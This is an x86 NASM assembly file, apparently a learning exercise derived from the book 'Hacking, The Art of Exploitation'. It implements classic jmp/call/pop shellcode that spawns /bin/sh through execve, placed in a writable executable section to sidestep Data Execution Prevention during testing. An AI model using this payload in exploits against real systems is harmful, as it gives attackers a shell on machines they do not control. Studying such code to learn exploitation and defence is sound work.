; David @InfinitelyManic
; Derived from Hacking, The Art of Exploitation, Jon Erickson
; exit_shellcode.s
; nasm -felf32 -g -F dwarf exec_shellcode.s -o exec_shellcode.o && ld exec_shellcode.o -o exec_shellcode -m elf_i386
;
bits 32
section .bss
section .data
section .mytext progbits alloc exec write align=16      ; required to diable Data Execution Prevention for testing 
        global _start
_start:
        jmp short two
one:
        ; i386 ebx ecx edx  esi edi ebp
        ; int execve(const char *filename, char *const argv[], char *const envp[]);
        pop ebx
        xor eax, eax
        mov [ebx+7], al                 ; _filename
        mov [ebx+8], ebx                ; null
        mov [ebx+12], eax               ; _filename

        lea ecx, [ebx+8]                ; argv ptr
        lea edx, [ebx+12]               ; envp ptr
        mov al, 11
        int 0x80

two:
        call one
        db '/bin/shXAAAABBBB'           ; XAAAABBBB not really needed

_exit:
        mov eax, 1
        int 0x80
